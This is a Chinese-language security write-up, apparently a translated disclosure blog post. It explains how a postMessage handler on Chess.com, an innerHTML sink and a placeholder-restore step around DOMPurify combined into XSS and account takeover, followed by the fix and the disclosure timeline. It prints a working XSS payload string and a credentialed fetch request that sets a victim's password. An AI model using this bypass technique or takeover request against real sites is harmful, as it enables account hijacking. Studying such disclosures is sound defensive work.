---
title: 【微信】XSS绕过DOMPurify接管Chess.com账号
source: https://mp.weixin.qq.com/s/-LuS0zgI3GTMRyWchev0vA
source_host: mp.weixin.qq.com
clip_date: 2026-11-29T00:29:19+08:00
trace_id: 186a2773-9b00-4e31-b7ba-2ef6ee3673d2
content_hash: cf3fc289320b53a2fad783db6d6297e0358e64bd62bbd5b22ce6d73c8fed38b7
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: 42675244-d011-810d-bff7-d36bddbcf56a
ioc: null
---

**北山安全** *2026年11月26日 20:30*

**摘要：** Chess.com 有一个 window.postMessage 处理器，它会接收来自任意来源的 SHOW_MESSAGE_MODAL 事件，并把攻击者的 user 对象直接拷贝进弹窗状态。弹窗又通过 innerHTML 渲染 user.username。这个字符串在路上经过了 DOMPurify 净化，本该到此为止。但事实并非如此：过滤器会先把棋盘图注释从输入中抽出来，净化剩下的部分，然后再把原始注释贴回去。DOMPurify 的判断，在回填执行的那一刻就不再作数了。又因为这段代码运行在已认证的源下，且通过 Google 或 Apple 创建的账号可以在不知道旧密码的情况下设置新密码，这最终成了一次账号接管。

**一、处理器**

事件名和 store 位于一个 633 字节的 chunk 中：

// shared.589ee882.BJxDD4qED1.chunk.js  
i = { Hide: \`message-modal:hide\`, Show: \`SHOW\_MESSAGE\_MODAL\` }

监听器在另一个 chunk 里。下面是清理过、去掉懒加载机制后的版本：

window.addEventListener(\`message\`, n => {  
let { data: r } = n;  
r?.event === l.Show && (  
t = mountAsync(import(\`./message-modal.7c99bc77.DWkgIKohg3.chunk.js\`)),  
Object.assign(store().user, r.user),  
t.mount(mountTarget)  
);  
r?.event === l.Hide && (t?.unmount(), t = void 0);  
});

函数体本身就是全部问题所在。Object.assign(store().user, r.user) 把传入 user 的每一个键都拷贝进弹窗的响应式状态，却完全不检查：消息来自哪里、字段是什么类型、哪些字段是发送方有权设置的。

在处理器里下断点，打印收到的内容：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/15dbdd612fd60fe3.jpg)

图：攻击者的 user 对象在处理器作用域中保持完整：isMessageable 为 false、notMessageableReasonCode 为 2，username 携带着载荷

n.event 是 'SHOW_MESSAGE_MODAL'，n.user 是我们的对象，原封不动，带着 isMessageable: false、notMessageableReasonCode: 2，username 里装着载荷。一个外部页面的数据，就这样坐进了处理器的作用域里，马上要被赋值进组件状态。

**二、innerHTML 汇点**

弹窗有两种状态。如果对方接受私信，你得到一个 textarea；如果不接受，你会看到一段解释原因的文案，而这段文案是按 HTML 构建的：

// message-modal.7c99bc77.DWkgIKohg3.chunk.js  
Or = \[\`innerHTML\`\]  
...  
O(n).isMessageable  
? S(\`\`,!0)  
: (D(), C(\`div\`, { key: 0, class: E(e.$style.restricted) }, \[  
Xe(\`div\`, { innerHTML: O(vr)(O(n).notMessageableReasonCode, O(n).username) }, null, 8, Or),  
...  
\]))

在受限分支上，内层 div 的内容来自 vr(notMessageableReasonCode, username)，并且是作为 HTML 而非文本赋值的。vr 是一个按原因码分支的小型 switch：

function vr(e, t) {  
switch (e) {  
case 1: return i(\`You cannot send messages to Guest accounts.\`);  
case 2: return i(\`%username% only accepts messages from friends.\`,  
{ "%username%": \`<strong>${t}</strong>\` });  
case 3: return i(\`You are blocked from sending %username% messages.\`,...);  
}  
}

Case 1 没有替换。Case 2 和 Case 3 会把 username 放进 <strong> 标签，再把结果交给 innerHTML。只要在你发送的对象里设置 isMessageable: false 和 notMessageableReasonCode: 2，你的 username 就会被当作 HTML 解析。

把用户名插值进标记、再过一遍净化器，本来是很常见的做法。它一直有效，直到净化器交回了一个它实际上从未净化过的东西。

**三、匹配、替换、重复**

过滤器叫 xssFilter。下面是报告中给出的形态，来自 common.DwbrK3-Lb0.chunk.js：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a723f1260b636e7c.jpg)

图：报告中的 xssFilter：先把棋盘图注释抽成占位符 token，运行 DOMPurify，再把原始注释还原回 token 所在位置

它的机制分三步：先把输入中每一个 &-diagramtype: 注释提取到一个数组里，在原位置留下一个 \__CHESS_DIAGRAM_PLACEHOLDER_n\_\_ token；然后对剥离后的字符串运行 **DOMPurify**；最后再把原始注释贴回 token 的位置：

i.replace(/\__CHESS_DIAGRAM_PLACEHOLDER\_(\\d+)\_\_/g, (e, n) => t\[parseInt(n, 10)\] || \`\`)

DOMPurify 的输出是 i。这个函数返回的，却是把原始注释写回去之后的 i。净化并不是对字符串的最后一次写入。回填才是，而最后写入者胜出——这正是标题的由来。

如今同样的逻辑位于 Ut 中，它是现在包裹这套逻辑的四个函数之一。Ht 在一个特性开关后面，在 Ut 和纯 DOMPurify 路径 Vt 之间做选择：

function Bt() {  
return!!window?.chesscom?.features?.includes?.(\`xss\_filter\_strip\_diagram\_comments\`)  
}  
  
function Vt(e, t) {  
//...forbidTags 处理、target/rel 钩子...  
return Rt.sanitize(n, { USE_PROFILES: { html:!0 }, ADD_ATTR: \[\`target\`\] })  
}  
  
function Ht(e, t = {}) {  
let n = typeof e == \`string\`? e: String(e);  
return Bt()? Vt(n, t): Ut(n, t)  
}  
  
function Ut(e, t) {  
let n = \[\];  
return Vt(  
e.replace(/<!--\[\\s\\S\]\*?&-diagramtype:\[\\s\\S\]\*?-->/g,  
e => \`\_\_CHESS\_DIAGRAM\_PLACEHOLDER\_${n.push(e) - 1}\_\_\`),  
t  
).replace(/\__CHESS_DIAGRAM_PLACEHOLDER\_(\\d+)\_\_/g,  
(e, t) => n\[parseInt(t, 10)\] || \`\`)  
}

Vt 是使用 html profile、并允许 target 属性的 DOMPurify，它返回的正是 DOMPurify 返回的内容。Ut 则是「抽取再还原」的版本，而且它至今仍是默认路径。Chess.com 把棋盘图以包含 &-diagramtype: 的 HTML 注释形式嵌入，而 DOMPurify 会剥掉注释，所以有人需要一种办法，让这些注释能穿过净化过程。把它们先拿出来、再贴回去，就是那个办法。

这不是 DOMPurify 的 bug，当时用的也不是旧版本——是当时的最新版 DOMPurify 3.2.5。你甚至不需要让注释以注释的形态存活下来。你只需要让占位符落在某个 DOMPurify 认为安全的位置，并且让贴回去的文本比它替换掉的 token 更长。

**四、占位符进，载荷出**

我们发送的 username 有两个起作用的部分：一个伪造的棋盘图注释——<!--&-diagramtype:"><img src=x onerror=alert(document.domain)>-->——里面携带着 <img onerror>；以及一个 <div>，它的 data-x 属性被我们预先填入了过滤器使用的那个精确占位符 token。

aaa<!--&-diagramtype:"><img src=x onerror=alert(document.domain)>--><div data-x="\__CHESS_DIAGRAM_PLACEHOLDER_0\_\_"></div>aa

第一次 replace 找到注释，把它存进数组，并在原位置放下一个 token。现在这个 token 出现了两次：一次在注释原来所在的位置，一次在 data-x 里面——是我们放进去的。组合后的字符串，就是到达 DOMPurify 的内容：

aaa\__CHESS_DIAGRAM_PLACEHOLDER_0\_\_<div data-x="\__CHESS_DIAGRAM_PLACEHOLDER_0\_\_"></div>aa

一段文本、一个带普通 data 属性的 <div>、再一段文本。这里没有任何需要净化的东西，所以 DOMPurify 原样放行：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/69c8049fd0f60431.jpg)

图：e、n、i 并排对比：DOMPurify 的输出 i 与 token 化后的输入 n 逐字节相同

e 是我们的输入，连注释一起；n 是把注释抽走、换成 token 之后的 e；i 是 DOMPurify 返回的结果，与 n 逐字节相同。那个 <img onerror> 从未到达净化器，它全程都躺在数组里。

现在回填会把两个 token 都填回原始注释。往 data-x 里写入的是 <!--&-diagramtype:"><img src=x onerror=alert(document.domain)>-->，而这个注释在 &-diagramtype: 之后紧跟着一个双引号。在被引号包裹的属性值内部，这个引号会提前闭合 data-x，其后的一切都会被当作 <div> 上的标记来解析：

<div data-x="aaa<!--&-diagramtype:"><img src=x onerror=alert(document.domain)>

那个埋着的双引号就是全部关键。注释干了两件事：它把 <img> 作为惰性的注释文本带过了 DOMPurify；而它内部的引号，在 token 被还原的那一刻，就突破了属性。

**五、账号接管**

alert() 只能证明代码能运行。让它真正有分量的，是它运行的位置：https://www.chess.com，在受害者已登录的会话内部。我们报告中提交的请求，打向了密码接口：

fetch("/rpc/chesscom.user_profile.v1.AccountService/SetUserNewPassword", {  
method: "POST",  
credentials: "include",  
headers: { "Content-Type": "application/json" },  
body: JSON.stringify({ newPassword: "..." })  
});

通过 Google 或 Apple 注册的账号从来没有设置过 Chess.com 密码，所以设置页提供了一个不要求输入旧密码的流程：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/acb5507804f046df.jpg)

图：Chess.com 的修改密码设置：只有新密码和确认字段，没有当前密码字段

这个页面只有新密码字段和确认字段，没有当前密码字段——这些账号从未设置过密码，所以根本没有旧密码可填。当这个请求从源内部发出、并带着受害者的 Cookie 时，它就能把账号密码设置成我们选定的值，无需旧密码。

剩下的就是普通的同源访问：受害者的收件箱、账号与安全设置，以及应用为已登录用户提供的、一切无需重新认证的功能。

**六、修复**

Chess.com 补上了处理器缺失的来源检查：

if (window.chesscom?.features?.includes(\`postmessage\_xss\_hardening\`)  
&& n.origin!== window.location.origin) return;

如果消息不是来自 window.location.origin，监听器会在到达 Object.assign 之前就返回。外部页面仍然可以调用 postMessage，但它的事件会被丢弃，而不是被拷贝进弹窗状态，这就关闭了利用所依赖的投递路径。

但这里有个隐患。这个检查被一个 postmessage_xss_hardening 特性开关把着门：只有 features.includes(...) 为真时，来源比较才会真正运行。如果开关没有打开，&& 会短路，处理器不会返回，消息会和以前一模一样地被处理。所以这层防护只在开关开启时才成立。

净化器现在也是同样的形态。Ht 在 xss_filter_strip_diagram_comments 启用时调用 Vt（纯 DOMPurify），未启用时则回落到 Ut（抽取再还原的版本）。那边的修复，同样离易受攻击的路径只差一个开关。

**七、披露时间线**

**2026 年 4 月 27 日**——XENOPS 以《通过 Chess.com 消息弹窗中的 postMessage DOM XSS 接管账号》为题，向 Chess.com 安全团队报告了该问题。

**分诊阶段**——Chess.com 确认报告有效，但以重复报告为由关闭，理由是此前已有人报告过更宽泛的根本原因：postMessage 处理器缺少 event.origin 校验。

**后续跟进**——Chess.com 确认，SHOW_MESSAGE_MODAL 向量和 DOMPurify 占位符还原绕过，在技术上与那个根本原因并不相同，且净化器绕过此前从未出现在任何报告中。

**2026 年 7 月 31 日**——XENOPS 确认，报告中的注入向量在生产环境已不可达，按报告所述的攻击路径不再能复现。

**2026 年 9 月 4 日**——在完成修复并与 Chess.com 协调后，本文发布。

**八、厂商回应与结语**

Chess.com 确认了该漏洞，但将此次提交归类为重复报告，这与其按更宽泛的根本原因、而非按具体处理器或利用路径来评估报告的政策一致。在这个案例中，根本原因就是各个 postMessage 处理器普遍缺少 event.origin 校验。

但这份报告仍然记录了三个 Chess.com 确认与此前任何提交都不同的要素：SHOW_MESSAGE_MODAL 投递向量、到达易受攻击渲染分支所需的那次特定弹窗状态转换，以及 DOMPurify 占位符还原绕过。尤其是净化器绕过，此前从未出现在任何报告中。

在重复归类下，没有发放赏金，Chess.com 提供了一个月免费的 Diamond 会员作为补偿。

我们认为这个结果喜忧参半。漏洞得到了确认和修复，这对用户安全来说是最重要的。它同时也表明，严格按根本原因判定重复的政策，可能会低估利用链研究的价值——当一个新的投递向量或一次净化器绕过实质性地改变了可利用性时，尤其如此。我们感谢 Chess.com 确认了该问题，并在生产环境中修复了报告所述的攻击路径。

**补充信息**

**标题：** 最后写入者胜出：通过 postMessage XSS 接管 Chess.com 账号

**描述：** Chess.com 的 postMessage 处理器会接收来自任意来源的 SHOW_MESSAGE_MODAL，并通过 innerHTML 渲染 username。DOMPurify 确实运行了，但一个占位符还原步骤把原始载荷又贴回了它的输出之上，最终把一次同源 XSS 变成了账号接管。

原文：XENOPS Blog《The Last Writer Wins: A Chess.com Account Takeover via postMessage XSS》  
原文链接：https://xenops.ae/blog/the-last-writer-wins

优秀文章 · 目录
